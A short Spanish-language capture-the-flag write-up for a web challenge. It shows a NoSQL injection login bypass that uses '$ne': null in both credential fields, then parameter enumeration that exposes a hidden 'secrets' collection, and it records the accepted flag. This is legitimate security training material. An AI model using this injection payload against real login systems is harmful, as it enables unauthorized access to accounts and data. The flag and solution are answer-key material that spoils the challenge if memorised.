# Web — No Structure Required

**Reto:** No Structure Required  
**Oleada:** 1  
**ID de reto:** `78`  
**Estado:** resuelto y validado.

**Flag aceptada:**
`POCTF{78.1522.18ede11389f8b1b7.LTMHLNXFGDBMUYDQR2YS42QI5J}`

## Resolución

La aplicación de notas usa documentos tipo MongoDB para autenticar y listar
colecciones. El login acepta una inyección NoSQL en ambos campos:

```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

La respuesta autentica como `j.abernathy`. En el dashboard, el parámetro
`col` controla la colección consultada. `col=notes` muestra las notas normales;
al enumerar nombres de colección, `col=secrets` devuelve el documento oculto
del equipo:

```json
{
  "_id": 1,
  "label": "team-flag",
  "flag": "POCTF{78.1522.18ede11389f8b1b7.LTMHLNXFGDBMUYDQR2YS42QI5J}"
}
```

La flag fue enviada al reto y el servidor respondió `Auditor's signature
verified.`.
